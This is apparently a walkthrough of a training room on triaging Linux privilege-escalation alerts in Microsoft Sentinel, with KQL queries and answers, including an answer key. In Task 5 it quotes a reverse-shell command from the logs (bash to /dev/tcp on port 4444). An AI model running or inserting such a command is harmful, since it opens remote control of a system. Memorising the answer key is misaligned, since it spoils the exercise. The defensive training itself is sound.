# Hi, I'm a Cybersecurity Analyst 
### Focused on analyzing threats, demonstrating attack scenarios, and conducting security investigations
### SOC Alert Triaging - Tinsel Triage
### Today, We are going investigate and triage alerts through Microsoft Sentinel.
<img width="1908" height="420" alt="image" src="https://github.com/user-attachments/assets/b5395fef-9330-487b-b96a-93850e7b2e6c" />

## Task 1 Introduction
<img width="1200" height="407" alt="image" src="https://github.com/user-attachments/assets/9b9698b9-e920-43fd-8530-48effcfc11df" />

### The SOC is overwhelmed with a massive wave of alerts, indicating a widespread disruption across the cloud environment.  
### Elves are struggling to identify the source as systems continue generating continuous warnings.  
### The activity appears coordinated and is affecting multiple services simultaneously.  
### Suspicion grows that the evil Easter Bunnies may be behind the ongoing attack.

### Learning Objectives
### Understand the importance of alert triage and prioritisation
### Explore Microsoft Sentinel to review and analyse alerts
### Correlate logs to identify real activities and determine alert verdicts


### To get started, go to the Microsoft Azure(opens in new tab) portal and use one of the username and temporary access listed below
<img width="1588" height="713" alt="image" src="https://github.com/user-attachments/assets/4e19316b-c125-4f48-8092-af179050fa7a" />

### Here is the link to access the portal  https://portal.azure.com/
### Enter temporary username and password 
<img width="1026" height="575" alt="image" src="https://github.com/user-attachments/assets/ee84f3a2-3cd9-44e0-b9f2-60d9512a59a3" />

### Answer
<img width="1612" height="224" alt="image" src="https://github.com/user-attachments/assets/9218dbbd-35f3-400e-8fa3-f3b0d9fd5d77" />

## Task 2 Alert Triaging Primer
### After successfully signing into Azure portal, let’s go ahead with task 2
<img width="1100" height="506" alt="image" src="https://github.com/user-attachments/assets/a5af31e5-c0f9-4edb-9bd9-b0ecfce0e04d" />


### It's Raining Alerts  
### McSkidy reports a surge of alerts across the Azure tenant, with dashboards showing suspicious activity indicating something unusual is happening.  
### Early signs suggest a possible attack by the Evil Bunnies, requiring immediate action to prevent impact on the company’s seasonal operations.
<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/13282ecc-200f-44e1-9111-06d65f59aaed" />

### Before using Microsoft Sentinel, McSkidy must understand the situation since not all incoming alerts are equally important.  
### Alert triaging helps distinguish real threats from noise and false positives, allowing the SOC team to prioritise effectively.

### Alert Triaging  
### Alert triaging involves a structured approach to assess and prioritise alerts based on importance and potential impact.  
### Analysts must quickly evaluate alerts using consistent criteria to decide what to prioritise and what actions to take next.
<img width="1582" height="490" alt="image" src="https://github.com/user-attachments/assets/68912448-cb4f-4fc4-80f9-d0fe3e5d10c6" />

### In short, these four represent the essential dimensions of triage:

### Severity: How bad?
### Time: When?
### Context: Where in the attack lifecycle?
### Impact: Who or what is affected?

### Once an alert is selected, analysts must follow a structured process to validate whether it is a real threat. 
### • Investigate the alert in detail  
### • Check related logs  
### • Correlate multiple alerts  
### • Build context and timeline  
### • Decide next action  
### • Document findings and lessons learned

<img width="1613" height="216" alt="image" src="https://github.com/user-attachments/assets/2d785ee9-4b8c-4887-9e3e-bb2d3f8b8abe" />

## Task 3 Environment Review
### Understanding the Logging Environment  
### Before investigating alerts, analysts must understand the logging environment to know what data is available.  
### This helps in interpreting logs correctly and improves the effectiveness of the investigation.

### Now we will be accessing the Microsoft Sentinel Logs
### Lets navigate to the Microsoft Azure portal and ensure you are logged in using the credentials provided in Task 1.
<img width="1100" height="457" alt="image" src="https://github.com/user-attachments/assets/c8dbcfa1-a35e-445e-bc91-20d73f885dd1" />

### Search for Microsoft Sentinel in the Azure portal search bar and click on the service.
### Opening Logs: 
### Once inside the Sentinel instance, we have to navigate to the Logs tab (usually found in the left-hand navigation pane under General or Logs).
<img width="1100" height="433" alt="image" src="https://github.com/user-attachments/assets/82ae5a1b-b203-4f1c-9adc-848c24199619" />

### Review Custom Logs: Run a query on the "Syslog_CL" table in the Sentinel Logs workspace, which contains system events and potential security activity data.  
### We use this to examine log data and identify any suspicious or security-related behaviour in the environment.
### Logs are always collected and stored first in the system.
### A query is only used to view, filter, or search those logs.
<img width="1032" height="550" alt="image" src="https://github.com/user-attachments/assets/2b225509-66ce-4e4d-a3a2-bbcd9d1e77cb" />

### Answer the questions below
<img width="1606" height="215" alt="image" src="https://github.com/user-attachments/assets/0486a9eb-0a1a-4311-bfc0-debaaf26dd6a" />

## Task 4 Investigation Proper
### We apply triaging principles in Microsoft Sentinel to investigate alerts in The Best Festival Company’s Azure environment.  
### We use Sentinel as a central platform to collect, correlate, and analyze security data for effective threat detection.
### We open Microsoft Sentinel in the Azure Portal to start investigating alerts.  
### We go to Threat management → Incidents to view and check security events.
<img width="1100" height="494" alt="image" src="https://github.com/user-attachments/assets/1202b4cd-d647-402e-ba0e-be560a49c100" />

### Refresh to view the incidents or click to go to the defender portal
<img width="959" height="824" alt="image" src="https://github.com/user-attachments/assets/63d9cdf0-14c9-4232-9a37-e31990b3cd2e" />

### Alert Triaging and Prioritization  

### We first review all open incidents in Microsoft Sentinel and prioritize High-severity alerts, as they indicate the most immediate risk.  
### We then investigate the “Linux PrivEsc—Kernel Module Insertion” alert as part of the triage process.

### Understanding Related Alerts (Correlation)  
### We correlate alerts linked to the same machine, user, or IP to identify if they are part of a single attack chain.  
### This helps us understand the full attack flow, such as initial access followed by privilege escalation and persistence

### 1) How many entities are affected by the Linux PrivEsc — Polkit Exploit Attempt alert? 
### Open Microsoft Sentinel → Incidents → 
### select “Linux PrivEsc - Polkit Exploit Attempt” 
<img width="961" height="869" alt="image" src="https://github.com/user-attachments/assets/d7f7150c-3f46-4777-924b-683abc93fc76" />

### →check the Assets field in the summary pane to find the number of affected entities.
<img width="960" height="808" alt="image" src="https://github.com/user-attachments/assets/da8eabe5-120c-42db-a026-1ded91c485e0" />

### Answer 10

### 2) What is the severity of the Linux PrivEsc — Sudo Shadow Access alert?
### Find the incident titled Linux PrivEsc - Sudo Shadow Access.
<img width="960" height="683" alt="image" src="https://github.com/user-attachments/assets/8d2013d7-f020-4ad6-8639-b583d77d2254" />

### Check the Severity column and scroll side
<img width="959" height="776" alt="image" src="https://github.com/user-attachments/assets/0d6cc3d7-a275-4651-a99e-0b4a93f78f4c" />

### Answer High

### 3) How many accounts were added to the sudoers group in the Linux PrivEsc — User Added to Sudo Group alert?
### Find the incident titled Linux PrivEsc - User Added to Sudo Group.
<img width="960" height="780" alt="image" src="https://github.com/user-attachments/assets/4289f0d7-ebb2-459f-8066-7fb6af9f1ba0" />

### Click View full details and review the events to determine the count of users involved in this activity.
<img width="956" height="501" alt="image" src="https://github.com/user-attachments/assets/2e5b54dd-8fea-4fa9-9a78-31201d8a8be3" />

### Answer the questions
<img width="1617" height="458" alt="image" src="https://github.com/user-attachments/assets/1f76f03d-da05-476b-8e50-edf91c96ca47" />

## Task 5 Diving Deeper Into Logs
### In-Depth Log Analysis with Sentinel  

### We now examine the raw log data in Microsoft Sentinel to validate alerts and understand the attacker’s actions.  
### We do this by analysing authentication attempts, command executions, and system changes to reconstruct the attack flow.

### 1) What is the name of the kernel module installed in websrv-01?
### Use this KQL Query provided in the task
### Click view query
<img width="954" height="388" alt="image" src="https://github.com/user-attachments/assets/21770ad2-404f-4a84-b089-f0078215bfbe" />

### Navigate to the open in advance hunting button
<img width="908" height="858" alt="image" src="https://github.com/user-attachments/assets/be8b00e3-ea02-4315-9d28-ed4a2ca9c383" />

--------------------------------------------------------------
### set query_now = datetime(2025-10-30T05:09:25.9886229Z);
### Syslog_CL
### | where host_s == 'websrv-01'
### | project _timestamp_t, host_s, Message
---------------------------------------------------------------

### Paste the query and click query
<img width="955" height="766" alt="image" src="https://github.com/user-attachments/assets/3a627d6c-9b45-454b-a7fa-93035901d62a" />

<img width="845" height="111" alt="image" src="https://github.com/user-attachments/assets/253848ee-f8a9-460c-b215-eeb1d2e58300" />

### Answer malicious_mod.ko
### 2) What is the unusual command executed within websrv-01 by the ops user?
### Here is the log
<img width="955" height="626" alt="image" src="https://github.com/user-attachments/assets/a7b06664-ae5b-4922-811d-695df364c6a0" />

### Answer: /bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1

### 3) What is the source IP address of the first successful SSH login to storage-01?
### Change the query host_s == 'storage-01' and run query
<img width="954" height="522" alt="image" src="https://github.com/user-attachments/assets/92d712ea-73b6-4898-bae7-f281a16717d2" />

### Change the timestamp to find the first successful SSH login
### Here is the Ip
<img width="882" height="554" alt="image" src="https://github.com/user-attachments/assets/de9b6180-048e-4e34-9363-db3842d7abd7" />

### Answer: 172.16.0.12

### 4) What is the external source IP that successfully logged in as root to app-01?
###  Change the query host_s == 'app-01' and run query
<img width="893" height="436" alt="image" src="https://github.com/user-attachments/assets/4743efca-e649-412d-b4bb-79d43c72b8c7" />

### We can observe the external Ip 
<img width="945" height="640" alt="image" src="https://github.com/user-attachments/assets/af4dfa26-c3b3-4e5a-871e-f0ab5bb688a7" />

### Answer: 203.0.113.45

### Aside from the backup user, what is the name of the user added to the sudoers group inside app-01?
### We can observe the username
<img width="943" height="674" alt="image" src="https://github.com/user-attachments/assets/98c4028d-bf2f-473d-b60d-c743bf2e3152" />

### Answer: deploy

### Answer the questions 
<img width="1610" height="742" alt="image" src="https://github.com/user-attachments/assets/2901a164-a771-413c-bdf9-9cd50bfaea91" />

## Congratulations !!! We have Successfully Completed the Room
<img width="1895" height="435" alt="image" src="https://github.com/user-attachments/assets/cc795435-b67d-4a7b-9771-8d94ee0d25cf" />



